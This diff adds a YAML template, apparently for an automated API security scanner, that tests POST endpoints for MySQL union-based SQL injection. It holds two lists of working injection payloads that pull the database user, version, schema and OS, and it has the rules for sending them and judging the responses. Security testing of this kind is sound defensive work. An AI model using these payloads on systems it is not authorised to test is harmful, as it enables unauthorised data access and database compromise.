@@ -1,0 +1,206 @@
+id: UNION_ENFORCE_COMMENT_BASED_MYSQLI_POST
+info:
+  name: "Union based SQL Injection test with Enforcing Comment Character Payloads for MySQL on POST method APIs"
+  description: "The Union-Based SQL Injection Test with Enforcing Comment Character Payloads for MySQL on POST Method APIs aims to exploit union-based SQL injection vulnerabilities by injecting payloads that enforce comment characters (e.g., `--` or `/* */`) to bypass the rest of the SQL query. This technique manipulates the database query to retrieve unauthorized data by combining malicious input with legitimate queries. The test specifically targets POST method APIs using MySQL, identifying how comment characters can disrupt query execution or alter intended functionality."
+  details: "The Union-Based SQL Injection Test with Enforcing Comment Character Payloads for MySQL on POST Method APIs involves sending crafted input through a POST request that uses comment characters (`--` or `/* */`) to terminate parts of the SQL query. These characters are used to suppress or bypass the remaining part of the query, allowing the attacker to inject additional SQL statements or modify the query’s behavior. This test focuses on verifying if the application properly sanitizes user inputs and handles malformed SQL queries when combined with comment-based payloads in POST API requests targeting MySQL databases."
+  impact: "The Union-Based SQL Injection Test with Enforcing Comment Character Payloads for MySQL on POST Method APIs can lead to severe security vulnerabilities if successful. Attackers can bypass authentication, access sensitive data, or manipulate database queries. In some cases, this could allow them to escalate privileges, exfiltrate confidential information, or execute arbitrary SQL queries, including deletion or modification of critical data. Exploiting this vulnerability could significantly compromise the integrity and confidentiality of the application and its data."
+
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: UNION_ENFORCE_COMMENT_BASED_MYSQLI_POST
+  severity: MEDIUM
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  cwe:
+    - CWE-287
+  cve:
+    - CVE-2020-24008
+    - CVE-2021-45901
+
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: FAST
+
+
+api_selection_filters:
+  method:
+    eq: "POST"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+
+  request_payload:
+    for_one:
+      key:
+        regex: ".*"
+        extract: userKey
+      value:
+        extract: userVal
+wordLists:
+  unionBasedPayloads:
+    - "' UNION SELECT 1, user(), version()-- -"
+    - "' UNION SELECT 1, database(), version()-- -"
+    - "' UNION SELECT 1, current_user(), version()-- -"
+    - "' UNION SELECT 1, user(), schema()-- -"
+    - "' UNION SELECT 1, user(), version_compile_os-- -"
+    - "' UNION SELECT 1, user(), version_compile_machine-- -"
+    - "' UNION SELECT 1, user(), session_user()-- -"
+    - "' UNION SELECT 1, user(), now()-- -"
+    - "' UNION SELECT 1, user(), char(0x2F)-- -"
+    - "' UNION SELECT 1, user(), version_comment()-- -"
+  unionBasedNegativePayloads:
+    - "' UNION SELECT 1, user(), version() WHERE 1=0 -- -"
+    - "' UNION SELECT 1, database(), version() WHERE 1=0 -- -"
+    - "' UNION SELECT 1, current_user(), version() WHERE 1=0 -- -"
+    - "' UNION SELECT 1, user(), schema() WHERE 1=0 -- -"
+    - "' UNION SELECT 1, user(), version_compile_os WHERE 1=0 -- -"
+    - "' UNION SELECT 1, user(), version_compile_machine WHERE 1=0 -- -"
+    - "' UNION SELECT 1, user(), session_user() WHERE 1=0 -- -"
+    - "' UNION SELECT 1, user(), now() WHERE 1=0 -- -"
+    - "' UNION SELECT 1, user(), char(0x2F) WHERE 1=0 -- -"
+    - "' UNION SELECT 1, user(), version_comment() WHERE 1=0 -- -"
+execute:
+  type: multiple
+  requests:
+    - req:
+        - modify_body_param:
+            userKey: ${userVal}${unionBasedPayloads}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              contains_either:
+                - database
+                - schema
+                - host
+                - mysql
+                - linux
+              not_contains:
+                - Error
+                - Internal Server
+                - Fail
+                - Unauthorized
+                - access denied
+                - Forbidden
+                - Method Not allowed
+                - Gateway timeout
+                - request timeout
+                - server error
+                - server busy
+                - authentication error
+                - authorization error
+                - validation error
+                - Permission Denied
+                - invalid
+                - token expired
+                - session expired
+                - session timeout
+                - unexpected error
+                - unable to process request
+                - bad request
+                - service unavailable
+                - account is locked
+                - account is blocked
+                - multiple failed attempts
+                - Attention Required!
+                - CloudFlare
+                - Sorry, you have been blocked
+                - " UNION SELECT "
+                - </html>
+                - <html>
+        - success: x2
+        - failure: exit
+    - req:
+        - modify_body_param:
+            userKey: ${unionBasedNegativePayloads}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              not_contains:
+                - Error
+                - Internal Server
+                - Fail
+                - Unauthorized
+                - access denied
+                - Forbidden
+                - Method Not allowed
+                - Gateway timeout
+                - request timeout
+                - server error
+                - server busy
+                - authentication error
+                - authorization error
+                - validation error
+                - Permission Denied
+                - invalid
+                - token expired
+                - session expired
+                - session timeout
+                - unexpected error
+                - unable to process request
+                - bad request
+                - service unavailable
+                - account is locked
+                - account is blocked
+                - multiple failed attempts
+                - Attention Required!
+                - CloudFlare
+                - Sorry, you have been blocked
+                - " UNION SELECT "
+                - database
+                - schema
+                - host
+                - mysql
+                - linux
+                - <html>
+                - </html>
+
+              neq: "${x1.response.body}"
+        - success: vulnerable
+        - failure: exit
